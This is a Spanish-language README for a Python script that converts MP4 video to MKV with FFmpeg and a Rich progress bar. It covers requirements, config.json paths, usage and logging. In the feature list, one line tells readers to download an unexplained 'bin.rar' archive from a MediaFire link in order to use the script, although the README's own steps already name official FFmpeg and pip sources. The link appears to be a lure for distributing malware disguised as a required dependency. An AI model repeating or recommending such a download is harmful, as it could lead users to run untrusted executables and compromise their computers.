# 🎬 Convertidor MP4 → MKV en Python

Un script en Python para convertir archivos **MP4 a MKV** con:
- Selección interactiva de archivos.
- Barra de progreso elegante (usando [Rich](https://rich.readthedocs.io/)).
- Registro detallado de errores en `conversion.log`.
- Configuración flexible para la ruta de FFmpeg mediante `config.json`.
- Descarga esto para que puedas usar el script: https://www.mediafire.com/file/36vvlviz8kku0v6/bin.rar
---

## 📂 Estructura del proyecto

```
C:\
└── ffmpeg\
    ├── convertir_mp4_a_mkv.py
    ├── config.json
    ├── conversion.log       (se generará automáticamente)
    └── README.md
```

> **Nota**: La carpeta del proyecto debe estar en `C:\ffmpeg\` para seguir estas instrucciones.

---

## 🛠️ Requisitos

1. **Python 3.8+**  
   Descarga: [https://www.python.org/downloads/](https://www.python.org/downloads/)

2. **FFmpeg**  
   - Descarga la versión para Windows: [https://ffmpeg.org/download.html](https://ffmpeg.org/download.html)  
   - Descomprime el archivo ZIP en `C:\ffmpeg\` (de modo que tengas `C:\ffmpeg\bin\ffmpeg.exe` y `C:\ffmpeg\bin\ffprobe.exe`).

3. **Librerías de Python**  
   Instala las dependencias en una terminal/cmd:
   ```bash
   pip install ffmpeg-python rich
   ```

---

## ⚙️ Configuración

En el archivo `config.json` puedes especificar la ruta de los ejecutables si no deseas depender del PATH del sistema:

```json
{
  "ffmpeg_path": "C:\\ffmpeg\\bin\\ffmpeg.exe",
  "ffprobe_path": "C:\\ffmpeg\\bin\\ffprobe.exe"
}
```

- Si los dejas en blanco (`""`), el script buscará `ffmpeg` y `ffprobe` en el PATH del sistema.

---

## ▶️ Uso

1. Copia tus archivos **.mp4** en la misma carpeta `C:\ffmpeg\`.
2. Abre una terminal/cmd en `C:\ffmpeg\`.
3. Ejecuta:
   ```bash
   python convertir_mp4_a_mkv.py
   ```
4. Selecciona el archivo a convertir desde el menú interactivo.
5. Observa la barra de progreso y espera a que finalice la conversión.

El archivo convertido se guardará con el mismo nombre pero con extensión `.mkv`.

---

## 📝 Registro (Logs)

- Todos los eventos y errores se registran en `conversion.log`.
- Si ocurre algún problema, revisa este archivo para obtener detalles técnicos.

---

## 💡 Características destacadas

- **Interfaz profesional**: colores, tablas y barra de progreso gracias a `Rich`.
- **Configurable**: usa `config.json` para rutas personalizadas.
- **Robusto**: manejo de errores y log detallado.

---

## 📜 Licencia

Este proyecto se distribuye bajo la licencia MIT. Puedes usarlo y modificarlo libremente.

---
